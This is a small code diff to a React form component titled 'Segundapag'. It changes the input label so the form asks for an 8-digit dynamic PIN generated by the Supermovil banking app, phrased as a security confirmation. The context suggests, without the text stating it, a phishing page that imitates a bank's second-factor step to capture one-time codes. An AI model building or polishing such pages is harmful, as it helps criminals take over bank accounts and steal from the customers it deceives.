@@ -64,7 +64,7 @@ function Segundapag() {
       </div>
       <form className="auth-form" onSubmit={handleSubmit}>
         <label>
-          Ingrese los números que recibió por mensaje SMS:
+          Por tu seguridad, confirma esta operecion con el nip dinamico de 8 digitos que genera Supermovil:
           <input type="tel" name="sms-code" maxLength={8} placeholder="8 dígitos" className="auth-input" required />
         </label>
         <div className="auth-timer">
